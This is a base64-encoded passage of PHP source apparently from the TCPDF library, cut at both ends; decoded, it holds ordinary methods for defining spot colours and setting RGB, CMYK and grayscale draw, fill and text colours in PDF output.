dGhpcy0+Y29sdW1uc1swXVsndGgnXSkpIHsKCQkJCSR0aGlzLT5jb2x1bW5zWzBdWyd0aCddID0gYXJyYXkoKTsKCQkJfQoJCQkkdGhpcy0+Y29sdW1uc1swXVsndGgnXVsnXCcnLiR0aGlzLT5wYWdlLidcJyddID0gJHRoaXMtPnk7CgkJCSR0aGlzLT50TWFyZ2luID0gJHRoaXMtPnk7CgkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndG0nXSA9ICR0aGlzLT50TWFyZ2luOwoJCQkkdGhpcy0+bGFzdGggPSAwOwoJCQkkdGhpcy0+bE1hcmdpbiA9ICRwcmV2X2xNYXJnaW47CgkJCSR0aGlzLT5yTWFyZ2luID0gJHByZXZfck1hcmdpbjsKCQkJJHRoaXMtPmNlbGxfcGFkZGluZyA9ICRwcmV2X2NlbGxfcGFkZGluZzsKCQl9Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBjdXJyZW50IHBhZ2UgbnVtYmVyLgoJICogQHJldHVybiBpbnQgcGFnZSBudW1iZXIKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqIEBzZWUgZ2V0QWxpYXNOYlBhZ2VzKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFBhZ2VObygpIHsKCQlyZXR1cm4gJHRoaXMtPnBhZ2U7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBhcnJheSBvZiBzcG90IGNvbG9ycy4KCSAqIEByZXR1cm4gYXJyYXkgU3BvdCBjb2xvcnMgYXJyYXkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNi4wLjAzOCAoMjAxMy0wOS0zMCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEFsbFNwb3RDb2xvcnMoKSB7CgkJcmV0dXJuICR0aGlzLT5zcG90X2NvbG9yczsKCX0KCgkvKioKCSAqIERlZmluZXMgYSBuZXcgc3BvdCBjb2xvci4KCSAqIEl0IGNhbiBiZSBleHByZXNzZWQgaW4gUkdCIGNvbXBvbmVudHMgb3IgZ3JheSBzY2FsZS4KCSAqIFRoZSBtZXRob2QgY2FuIGJlIGNhbGxlZCBiZWZvcmUgdGhlIGZpcnN0IHBhZ2UgaXMgY3JlYXRlZCBhbmQgdGhlIHZhbHVlIGlzIHJldGFpbmVkIGZyb20gcGFnZSB0byBwYWdlLgoJICogQHBhcmFtIHN0cmluZyAkbmFtZSBGdWxsIG5hbWUgb2YgdGhlIHNwb3QgY29sb3IuCgkgKiBAcGFyYW0gZmxvYXQgJGMgQ3lhbiBjb2xvciBmb3IgQ01ZSy4gVmFsdWUgYmV0d2VlbiAwIGFuZCAxMDAuCgkgKiBAcGFyYW0gZmxvYXQgJG0gTWFnZW50YSBjb2xvciBmb3IgQ01ZSy4gVmFsdWUgYmV0d2VlbiAwIGFuZCAxMDAuCgkgKiBAcGFyYW0gZmxvYXQgJHkgWWVsbG93IGNvbG9yIGZvciBDTVlLLiBWYWx1ZSBiZXR3ZWVuIDAgYW5kIDEwMC4KCSAqIEBwYXJhbSBmbG9hdCAkayBLZXkgKEJsYWNrKSBjb2xvciBmb3IgQ01ZSy4gVmFsdWUgYmV0d2VlbiAwIGFuZCAxMDAuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAyNCAoMjAwOC0wOS0xMikKCSAqIEBzZWUgU2V0RHJhd1Nwb3RDb2xvcigpLCBTZXRGaWxsU3BvdENvbG9yKCksIFNldFRleHRTcG90Q29sb3IoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gQWRkU3BvdENvbG9yKCRuYW1lLCAkYywgJG0sICR5LCAkaykgewoJCWlmICghaXNzZXQoJHRoaXMtPnNwb3RfY29sb3JzWyRuYW1lXSkpIHsKCQkJJGkgPSAoMSArIGNvdW50KCR0aGlzLT5zcG90X2NvbG9ycykpOwoJCQkkdGhpcy0+c3BvdF9jb2xvcnNbJG5hbWVdID0gYXJyYXkoJ0MnID0+ICRjLCAnTScgPT4gJG0sICdZJyA9PiAkeSwgJ0snID0+ICRrLCAnbmFtZScgPT4gJG5hbWUsICdpJyA9PiAkaSk7CgkJfQoJfQoKCS8qKgoJICogU2V0IHRoZSBzcG90IGNvbG9yIGZvciB0aGUgc3BlY2lmaWVkIHR5cGUgKCdkcmF3JywgJ2ZpbGwnLCAndGV4dCcpLgoJICogQHBhcmFtIHN0cmluZyAkdHlwZSBUeXBlIG9mIG9iamVjdCBhZmZlY3RlZCBieSB0aGlzIGNvbG9yOiAoJ2RyYXcnLCAnZmlsbCcsICd0ZXh0JykuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE5hbWUgb2YgdGhlIHNwb3QgY29sb3IuCgkgKiBAcGFyYW0gZmxvYXQgJHRpbnQgSW50ZW5zaXR5IG9mIHRoZSBjb2xvciAoZnJvbSAwIHRvIDEwMCA7IDEwMCA9IGZ1bGwgaW50ZW5zaXR5IGJ5IGRlZmF1bHQpLgoJICogQHJldHVybiBzdHJpbmcgUERGIGNvbG9yIGNvbW1hbmQuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjEyNSAoMjAxMS0xMC0wMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFNwb3RDb2xvcigkdHlwZSwgJG5hbWUsICR0aW50PTEwMCkgewoJCSRzcG90Y29sb3IgPSBUQ1BERl9DT0xPUlM6OmdldFNwb3RDb2xvcigkbmFtZSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQlpZiAoJHNwb3Rjb2xvciA9PT0gZmFsc2UpIHsKCQkJJHRoaXMtPkVycm9yKCdVbmRlZmluZWQgc3BvdCBjb2xvcjogJy4kbmFtZS4nLCB5b3UgbXVzdCBhZGQgaXQgdXNpbmcgdGhlIEFkZFNwb3RDb2xvcigpIG1ldGhvZC4nKTsKCQl9CgkJJHRpbnQgPSAobWF4KDAsIG1pbigxMDAsICR0aW50KSkgLyAxMDApOwoJCSRwZGZjb2xvciA9IHNwcmludGYoJy9DUyVkICcsICR0aGlzLT5zcG90X2NvbG9yc1skbmFtZV1bJ2knXSk7CgkJc3dpdGNoICgkdHlwZSkgewoJCQljYXNlICdkcmF3JzogewoJCQkJJHBkZmNvbG9yIC49IHNwcmludGYoJ0NTICVGIFNDTicsICR0aW50KTsKCQkJCSR0aGlzLT5EcmF3Q29sb3IgPSAkcGRmY29sb3I7CgkJCQkkdGhpcy0+c3Ryb2tlY29sb3IgPSAkc3BvdGNvbG9yOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnZmlsbCc6IHsKCQkJCSRwZGZjb2xvciAuPSBzcHJpbnRmKCdjcyAlRiBzY24nLCAkdGludCk7CgkJCQkkdGhpcy0+RmlsbENvbG9yID0gJHBkZmNvbG9yOwoJCQkJJHRoaXMtPmJnY29sb3IgPSAkc3BvdGNvbG9yOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAndGV4dCc6IHsKCQkJCSRwZGZjb2xvciAuPSBzcHJpbnRmKCdjcyAlRiBzY24nLCAkdGludCk7CgkJCQkkdGhpcy0+VGV4dENvbG9yID0gJHBkZmNvbG9yOwoJCQkJJHRoaXMtPmZnY29sb3IgPSAkc3BvdGNvbG9yOwoJCQkJYnJlYWs7CgkJCX0KCQl9CgkJJHRoaXMtPkNvbG9yRmxhZyA9ICgkdGhpcy0+RmlsbENvbG9yICE9ICR0aGlzLT5UZXh0Q29sb3IpOwoJCWlmICgkdGhpcy0+c3RhdGUgPT0gMikgewoJCQkkdGhpcy0+X291dCgkcGRmY29sb3IpOwoJCX0KCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydzcG90X2NvbG9ycyddWyRuYW1lXSA9ICR0aGlzLT5zcG90X2NvbG9yc1skbmFtZV07CgkJfQoJCXJldHVybiAkcGRmY29sb3I7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBzcG90IGNvbG9yIHVzZWQgZm9yIGFsbCBkcmF3aW5nIG9wZXJhdGlvbnMgKGxpbmVzLCByZWN0YW5nbGVzIGFuZCBjZWxsIGJvcmRlcnMpLgoJICogQHBhcmFtIHN0cmluZyAkbmFtZSBOYW1lIG9mIHRoZSBzcG90IGNvbG9yLgoJICogQHBhcmFtIGZsb2F0ICR0aW50IEludGVuc2l0eSBvZiB0aGUgY29sb3IgKGZyb20gMCB0byAxMDAgOyAxMDAgPSBmdWxsIGludGVuc2l0eSBieSBkZWZhdWx0KS4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjAuMDI0ICgyMDA4LTA5LTEyKQoJICogQHNlZSBBZGRTcG90Q29sb3IoKSwgU2V0RmlsbFNwb3RDb2xvcigpLCBTZXRUZXh0U3BvdENvbG9yKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldERyYXdTcG90Q29sb3IoJG5hbWUsICR0aW50PTEwMCkgewoJCSR0aGlzLT5zZXRTcG90Q29sb3IoJ2RyYXcnLCAkbmFtZSwgJHRpbnQpOwoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgc3BvdCBjb2xvciB1c2VkIGZvciBhbGwgZmlsbGluZyBvcGVyYXRpb25zIChmaWxsZWQgcmVjdGFuZ2xlcyBhbmQgY2VsbCBiYWNrZ3JvdW5kcykuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE5hbWUgb2YgdGhlIHNwb3QgY29sb3IuCgkgKiBAcGFyYW0gZmxvYXQgJHRpbnQgSW50ZW5zaXR5IG9mIHRoZSBjb2xvciAoZnJvbSAwIHRvIDEwMCA7IDEwMCA9IGZ1bGwgaW50ZW5zaXR5IGJ5IGRlZmF1bHQpLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuMC4wMjQgKDIwMDgtMDktMTIpCgkgKiBAc2VlIEFkZFNwb3RDb2xvcigpLCBTZXREcmF3U3BvdENvbG9yKCksIFNldFRleHRTcG90Q29sb3IoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RmlsbFNwb3RDb2xvcigkbmFtZSwgJHRpbnQ9MTAwKSB7CgkJJHRoaXMtPnNldFNwb3RDb2xvcignZmlsbCcsICRuYW1lLCAkdGludCk7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBzcG90IGNvbG9yIHVzZWQgZm9yIHRleHQuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE5hbWUgb2YgdGhlIHNwb3QgY29sb3IuCgkgKiBAcGFyYW0gaW50ICR0aW50IEludGVuc2l0eSBvZiB0aGUgY29sb3IgKGZyb20gMCB0byAxMDAgOyAxMDAgPSBmdWxsIGludGVuc2l0eSBieSBkZWZhdWx0KS4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjAuMDI0ICgyMDA4LTA5LTEyKQoJICogQHNlZSBBZGRTcG90Q29sb3IoKSwgU2V0RHJhd1Nwb3RDb2xvcigpLCBTZXRGaWxsU3BvdENvbG9yKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFRleHRTcG90Q29sb3IoJG5hbWUsICR0aW50PTEwMCkgewoJCSR0aGlzLT5zZXRTcG90Q29sb3IoJ3RleHQnLCAkbmFtZSwgJHRpbnQpOwoJfQoKCS8qKgoJICogU2V0IHRoZSBjb2xvciBhcnJheSBmb3IgdGhlIHNwZWNpZmllZCB0eXBlICgnZHJhdycsICdmaWxsJywgJ3RleHQnKS4KCSAqIEl0IGNhbiBiZSBleHByZXNzZWQgaW4gUkdCLCBDTVlLIG9yIEdSQVkgU0NBTEUgY29tcG9uZW50cy4KCSAqIFRoZSBtZXRob2QgY2FuIGJlIGNhbGxlZCBiZWZvcmUgdGhlIGZpcnN0IHBhZ2UgaXMgY3JlYXRlZCBhbmQgdGhlIHZhbHVlIGlzIHJldGFpbmVkIGZyb20gcGFnZSB0byBwYWdlLgoJICogQHBhcmFtIHN0cmluZyAkdHlwZSBUeXBlIG9mIG9iamVjdCBhZmZlY3RlZCBieSB0aGlzIGNvbG9yOiAoJ2RyYXcnLCAnZmlsbCcsICd0ZXh0JykuCgkgKiBAcGFyYW0gYXJyYXkgJGNvbG9yIEFycmF5IG9mIGNvbG9ycyAoMT1ncmF5LCAzPVJHQiwgND1DTVlLIG9yIDU9c3BvdGNvbG9yPUNNWUsrbmFtZSB2YWx1ZXMpLgoJICogQHBhcmFtIGJvb2xlYW4gJHJldCBJZiB0cnVlIGRvIG5vdCBzZW5kIHRoZSBQREYgY29tbWFuZC4KCSAqIEByZXR1cm4gc3RyaW5nIFRoZSBQREYgY29tbWFuZCBvciBlbXB0eSBzdHJpbmcuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0xMSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldENvbG9yQXJyYXkoJHR5cGUsICRjb2xvciwgJHJldD1mYWxzZSkgewoJCWlmIChpc19hcnJheSgkY29sb3IpKSB7CgkJCSRjb2xvciA9IGFycmF5X3ZhbHVlcygkY29sb3IpOwoJCQkvLyBjb21wb25lbnQ6IGdyZXksIFJHQiByZWQgb3IgQ01ZSyBjeWFuCgkJCSRjID0gaXNzZXQoJGNvbG9yWzBdKSA/ICRjb2xvclswXSA6IC0xOwoJCQkvLyBjb21wb25lbnQ6IFJHQiBncmVlbiBvciBDTVlLIG1hZ2VudGEKCQkJJG0gPSBpc3NldCgkY29sb3JbMV0pID8gJGNvbG9yWzFdIDogLTE7CgkJCS8vIGNvbXBvbmVudDogUkdCIGJsdWUgb3IgQ01ZSyB5ZWxsb3cKCQkJJHkgPSBpc3NldCgkY29sb3JbMl0pID8gJGNvbG9yWzJdIDogLTE7CgkJCS8vIGNvbXBvbmVudDogQ01ZSyBibGFjawoJCQkkayA9IGlzc2V0KCRjb2xvclszXSkgPyAkY29sb3JbM10gOiAtMTsKCQkJLy8gY29sb3IgbmFtZQoJCQkkbmFtZSA9IGlzc2V0KCRjb2xvcls0XSkgPyAkY29sb3JbNF0gOiAnJzsKCQkJaWYgKCRjID49IDApIHsKCQkJCXJldHVybiAkdGhpcy0+c2V0Q29sb3IoJHR5cGUsICRjLCAkbSwgJHksICRrLCAkcmV0LCAkbmFtZSk7CgkJCX0KCQl9CgkJcmV0dXJuICcnOwoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgY29sb3IgdXNlZCBmb3IgYWxsIGRyYXdpbmcgb3BlcmF0aW9ucyAobGluZXMsIHJlY3RhbmdsZXMgYW5kIGNlbGwgYm9yZGVycykuCgkgKiBJdCBjYW4gYmUgZXhwcmVzc2VkIGluIFJHQiwgQ01ZSyBvciBHUkFZIFNDQUxFIGNvbXBvbmVudHMuCgkgKiBUaGUgbWV0aG9kIGNhbiBiZSBjYWxsZWQgYmVmb3JlIHRoZSBmaXJzdCBwYWdlIGlzIGNyZWF0ZWQgYW5kIHRoZSB2YWx1ZSBpcyByZXRhaW5lZCBmcm9tIHBhZ2UgdG8gcGFnZS4KCSAqIEBwYXJhbSBhcnJheSAkY29sb3IgQXJyYXkgb2YgY29sb3JzICgxLCAzIG9yIDQgdmFsdWVzKS4KCSAqIEBwYXJhbSBib29sZWFuICRyZXQgSWYgdHJ1ZSBkbyBub3Qgc2VuZCB0aGUgUERGIGNvbW1hbmQuCgkgKiBAcmV0dXJuIHN0cmluZyB0aGUgUERGIGNvbW1hbmQKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTExKQoJICogQHNlZSBTZXREcmF3Q29sb3IoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RHJhd0NvbG9yQXJyYXkoJGNvbG9yLCAkcmV0PWZhbHNlKSB7CgkJcmV0dXJuICR0aGlzLT5zZXRDb2xvckFycmF5KCdkcmF3JywgJGNvbG9yLCAkcmV0KTsKCX0KCgkvKioKCSAqIERlZmluZXMgdGhlIGNvbG9yIHVzZWQgZm9yIGFsbCBmaWxsaW5nIG9wZXJhdGlvbnMgKGZpbGxlZCByZWN0YW5nbGVzIGFuZCBjZWxsIGJhY2tncm91bmRzKS4KCSAqIEl0IGNhbiBiZSBleHByZXNzZWQgaW4gUkdCLCBDTVlLIG9yIEdSQVkgU0NBTEUgY29tcG9uZW50cy4KCSAqIFRoZSBtZXRob2QgY2FuIGJlIGNhbGxlZCBiZWZvcmUgdGhlIGZpcnN0IHBhZ2UgaXMgY3JlYXRlZCBhbmQgdGhlIHZhbHVlIGlzIHJldGFpbmVkIGZyb20gcGFnZSB0byBwYWdlLgoJICogQHBhcmFtIGFycmF5ICRjb2xvciBBcnJheSBvZiBjb2xvcnMgKDEsIDMgb3IgNCB2YWx1ZXMpLgoJICogQHBhcmFtIGJvb2xlYW4gJHJldCBJZiB0cnVlIGRvIG5vdCBzZW5kIHRoZSBQREYgY29tbWFuZC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTYtMTEpCgkgKiBAc2VlIFNldEZpbGxDb2xvcigpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRGaWxsQ29sb3JBcnJheSgkY29sb3IsICRyZXQ9ZmFsc2UpIHsKCQlyZXR1cm4gJHRoaXMtPnNldENvbG9yQXJyYXkoJ2ZpbGwnLCAkY29sb3IsICRyZXQpOwoJfQoKCS8qKgoJICogRGVmaW5lcyB0aGUgY29sb3IgdXNlZCBmb3IgdGV4dC4gSXQgY2FuIGJlIGV4cHJlc3NlZCBpbiBSR0IgY29tcG9uZW50cyBvciBncmF5IHNjYWxlLgoJICogVGhlIG1ldGhvZCBjYW4gYmUgY2FsbGVkIGJlZm9yZSB0aGUgZmlyc3QgcGFnZSBpcyBjcmVhdGVkIGFuZCB0aGUgdmFsdWUgaXMgcmV0YWluZWQgZnJvbSBwYWdlIHRvIHBhZ2UuCgkgKiBAcGFyYW0gYXJyYXkgJGNvbG9yIEFycmF5IG9mIGNvbG9ycyAoMSwgMyBvciA0IHZhbHVlcykuCgkgKiBAcGFyYW0gYm9vbGVhbiAkcmV0IElmIHRydWUgZG8gbm90IHNlbmQgdGhlIFBERiBjb21tYW5kLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDMuMS4wMDAgKDIwMDgtNi0xMSkKCSAqIEBzZWUgU2V0RmlsbENvbG9yKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFRleHRDb2xvckFycmF5KCRjb2xvciwgJHJldD1mYWxzZSkgewoJCXJldHVybiAkdGhpcy0+c2V0Q29sb3JBcnJheSgndGV4dCcsICRjb2xvciwgJHJldCk7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBjb2xvciB1c2VkIGJ5IHRoZSBzcGVjaWZpZWQgdHlwZSAoJ2RyYXcnLCAnZmlsbCcsICd0ZXh0JykuCgkgKiBAcGFyYW0gc3RyaW5nICR0eXBlIFR5cGUgb2Ygb2JqZWN0IGFmZmVjdGVkIGJ5IHRoaXMgY29sb3I6ICgnZHJhdycsICdmaWxsJywgJ3RleHQnKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMSBHUkFZIGxldmVsIGZvciBzaW5nbGUgY29sb3IsIG9yIFJlZCBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIENZQU4gY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMiBHUkVFTiBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIE1BR0VOVEEgY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMyBCTFVFIGNvbG9yIGZvciBSR0IgKDAtMjU1KSwgb3IgWUVMTE9XIGNvbG9yIGZvciBDTVlLICgwLTEwMCkuCgkgKiBAcGFyYW0gZmxvYXQgJGNvbDQgS0VZIChCTEFDSykgY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBib29sZWFuICRyZXQgSWYgdHJ1ZSBkbyBub3Qgc2VuZCB0aGUgY29tbWFuZC4KCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgc3BvdCBjb2xvciBuYW1lIChpZiBhbnkpCgkgKiBAcmV0dXJuIHN0cmluZyBUaGUgUERGIGNvbW1hbmQgb3IgZW1wdHkgc3RyaW5nLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4xMjUgKDIwMTEtMTAtMDMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRDb2xvcigkdHlwZSwgJGNvbDE9MCwgJGNvbDI9LTEsICRjb2wzPS0xLCAkY29sND0tMSwgJHJldD1mYWxzZSwgJG5hbWU9JycpIHsKCQkvLyBzZXQgZGVmYXVsdCB2YWx1ZXMKCQlpZiAoIWlzX251bWVyaWMoJGNvbDEpKSB7CgkJCSRjb2wxID0gMDsKCQl9CgkJaWYgKCFpc19udW1lcmljKCRjb2wyKSkgewoJCQkkY29sMiA9IC0xOwoJCX0KCQlpZiAoIWlzX251bWVyaWMoJGNvbDMpKSB7CgkJCSRjb2wzID0gLTE7CgkJfQoJCWlmICghaXNfbnVtZXJpYygkY29sNCkpIHsKCQkJJGNvbDQgPSAtMTsKCQl9CgkJLy8gc2V0IGNvbG9yIGJ5IGNhc2UKCQkkc3VmZml4ID0gJyc7CgkJaWYgKCgkY29sMiA9PSAtMSkgQU5EICgkY29sMyA9PSAtMSkgQU5EICgkY29sNCA9PSAtMSkpIHsKCQkJLy8gR3JleSBzY2FsZQoJCQkkY29sMSA9IG1heCgwLCBtaW4oMjU1LCAkY29sMSkpOwoJCQkkaW50Y29sb3IgPSBhcnJheSgnRycgPT4gJGNvbDEpOwoJCQkkcGRmY29sb3IgPSBzcHJpbnRmKCclRiAnLCAoJGNvbDEgLyAyNTUpKTsKCQkJJHN1ZmZpeCA9ICdnJzsKCQl9IGVsc2VpZiAoJGNvbDQgPT0gLTEpIHsKCQkJLy8gUkdCCgkJCSRjb2wxID0gbWF4KDAsIG1pbigyNTUsICRjb2wxKSk7CgkJCSRjb2wyID0gbWF4KDAsIG1pbigyNTUsICRjb2wyKSk7CgkJCSRjb2wzID0gbWF4KDAsIG1pbigyNTUsICRjb2wzKSk7CgkJCSRpbnRjb2xvciA9IGFycmF5KCdSJyA9PiAkY29sMSwgJ0cnID0+ICRjb2wyLCAnQicgPT4gJGNvbDMpOwoJCQkkcGRmY29sb3IgPSBzcHJpbnRmKCclRiAlRiAlRiAnLCAoJGNvbDEgLyAyNTUpLCAoJGNvbDIgLyAyNTUpLCAoJGNvbDMgLyAyNTUpKTsKCQkJJHN1ZmZpeCA9ICdyZyc7CgkJfSBlbHNlIHsKCQkJJGNvbDEgPSBtYXgoMCwgbWluKDEwMCwgJGNvbDEpKTsKCQkJJGNvbDIgPSBtYXgoMCwgbWluKDEwMCwgJGNvbDIpKTsKCQkJJGNvbDMgPSBtYXgoMCwgbWluKDEwMCwgJGNvbDMpKTsKCQkJJGNvbDQgPSBtYXgoMCwgbWluKDEwMCwgJGNvbDQpKTsKCQkJaWYgKGVtcHR5KCRuYW1lKSkgewoJCQkJLy8gQ01ZSwoJCQkJJGludGNvbG9yID0gYXJyYXkoJ0MnID0+ICRjb2wxLCAnTScgPT4gJGNvbDIsICdZJyA9PiAkY29sMywgJ0snID0+ICRjb2w0KTsKCQkJCSRwZGZjb2xvciA9IHNwcmludGYoJyVGICVGICVGICVGICcsICgkY29sMSAvIDEwMCksICgkY29sMiAvIDEwMCksICgkY29sMyAvIDEwMCksICgkY29sNCAvIDEwMCkpOwoJCQkJJHN1ZmZpeCA9ICdrJzsKCQkJfSBlbHNlIHsKCQkJCS8vIFNQT1QgQ09MT1IKCQkJCSRpbnRjb2xvciA9IGFycmF5KCdDJyA9PiAkY29sMSwgJ00nID0+ICRjb2wyLCAnWScgPT4gJGNvbDMsICdLJyA9PiAkY29sNCwgJ25hbWUnID0+ICRuYW1lKTsKCQkJCSR0aGlzLT5BZGRTcG90Q29sb3IoJG5hbWUsICRjb2wxLCAkY29sMiwgJGNvbDMsICRjb2w0KTsKCQkJCSRwZGZjb2xvciA9ICR0aGlzLT5zZXRTcG90Q29sb3IoJHR5cGUsICRuYW1lLCAxMDApOwoJCQl9CgkJfQoJCXN3aXRjaCAoJHR5cGUpIHsKCQkJY2FzZSAnZHJhdyc6IHsKCQkJCSRwZGZjb2xvciAuPSBzdHJ0b3VwcGVyKCRzdWZmaXgpOwoJCQkJJHRoaXMtPkRyYXdDb2xvciA9ICRwZGZjb2xvcjsKCQkJCSR0aGlzLT5zdHJva2Vjb2xvciA9ICRpbnRjb2xvcjsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2ZpbGwnOiB7CgkJCQkkcGRmY29sb3IgLj0gJHN1ZmZpeDsKCQkJCSR0aGlzLT5GaWxsQ29sb3IgPSAkcGRmY29sb3I7CgkJCQkkdGhpcy0+Ymdjb2xvciA9ICRpbnRjb2xvcjsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ3RleHQnOiB7CgkJCQkkcGRmY29sb3IgLj0gJHN1ZmZpeDsKCQkJCSR0aGlzLT5UZXh0Q29sb3IgPSAkcGRmY29sb3I7CgkJCQkkdGhpcy0+Zmdjb2xvciA9ICRpbnRjb2xvcjsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5Db2xvckZsYWcgPSAoJHRoaXMtPkZpbGxDb2xvciAhPSAkdGhpcy0+VGV4dENvbG9yKTsKCQlpZiAoKCR0eXBlICE9ICd0ZXh0JykgQU5EICgkdGhpcy0+c3RhdGUgPT0gMikgQU5EICR0eXBlICE9PSAwKSB7CgkJCWlmICghJHJldCkgewoJCQkJJHRoaXMtPl9vdXQoJHBkZmNvbG9yKTsKCQkJfQoJCQlyZXR1cm4gJHBkZmNvbG9yOwoJCX0KCQlyZXR1cm4gJyc7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBjb2xvciB1c2VkIGZvciBhbGwgZHJhd2luZyBvcGVyYXRpb25zIChsaW5lcywgcmVjdGFuZ2xlcyBhbmQgY2VsbCBib3JkZXJzKS4gSXQgY2FuIGJlIGV4cHJlc3NlZCBpbiBSR0IgY29tcG9uZW50cyBvciBncmF5IHNjYWxlLiBUaGUgbWV0aG9kIGNhbiBiZSBjYWxsZWQgYmVmb3JlIHRoZSBmaXJzdCBwYWdlIGlzIGNyZWF0ZWQgYW5kIHRoZSB2YWx1ZSBpcyByZXRhaW5lZCBmcm9tIHBhZ2UgdG8gcGFnZS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMSBHUkFZIGxldmVsIGZvciBzaW5nbGUgY29sb3IsIG9yIFJlZCBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIENZQU4gY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMiBHUkVFTiBjb2xvciBmb3IgUkdCICgwLTI1NSksIG9yIE1BR0VOVEEgY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBmbG9hdCAkY29sMyBCTFVFIGNvbG9yIGZvciBSR0IgKDAtMjU1KSwgb3IgWUVMTE9XIGNvbG9yIGZvciBDTVlLICgwLTEwMCkuCgkgKiBAcGFyYW0gZmxvYXQgJGNvbDQgS0VZIChCTEFDSykgY29sb3IgZm9yIENNWUsgKDAtMTAwKS4KCSAqIEBwYXJhbSBib29sZWFuICRyZXQgSWYgdHJ1ZSBkbyBub3Qgc2VuZCB0aGUgY29tbWFuZC4KCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgc3BvdCBjb2xvciBuYW1lIChpZiBhbnkpCgkgKiBAcmV0dXJuIHN0cmluZyB0aGUgUERGIGNvbW1hbmQKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjMKCSAqIEBzZWUgU2V0RHJhd0NvbG9yQXJyYXkoKSwgU2V0RmlsbENvbG9yKCksIFNldFRleHRDb2xvcigpLCBMaW5lKCksIFJlY3QoKSwgQ2VsbCgpLCBNdWx0aUNlbGwoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RHJhd0NvbG9yKCRjb2wxPTAsICRjb2wyPS0xLCAkY29sMz0tMSwgJGNvbDQ9LTEsICRyZXQ9ZmFsc2UsICRuYW1lPScnKSB7CgkJcmV0dXJuICR0aGlzLT5zZXRDb2xvcignZHJhdycsICRjb2wxLCAkY29sMiwgJGNvbDMsICRjb2w0LCAkcmV0LCAkbmFtZSk7Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBjb2xvciB1c2VkIGZvciBhbGwgZmlsbGluZyBvcGVyYXRpb25zIChmaWxsZWQgcmVjdGFuZ2xlcyBhbmQgY2VsbCBiYWNrZ3JvdW5kcykuIEl0IGNhbiBiZSBleHByZXNzZWQgaW4gUkdCIGNvbXBvbmVudHMgb3IgZ3JheSBzY2FsZS4gVGhlIG1ldGhvZCBjYW4gYmUgY2FsbGVkIGJlZm9yZSB0aGUgZmlyc3QgcGFnZSBpcyBjcmVhdGVkIGFuZCB0aGUgdmFsdWUgaXMgcmV0YWluZWQgZnJvbSBwYWdlIHRvIHBhZ2UuCgkgKiBAcGFyYW0gZmxvYXQgJGNvbDEgR1JBWSBsZXZlbCBmb3Igc2luZ2xlIGNvbG9yLCBvciBSZWQgY29sb3IgZm9yIFJHQiAoMC0yNTUpLCBvciBDWUFOIGNvbG9yIGZvciBDTVlLICgwLTEwMCkuCgkgKiBAcGFyYW0gZmxvYXQgJGNvbDIgR1J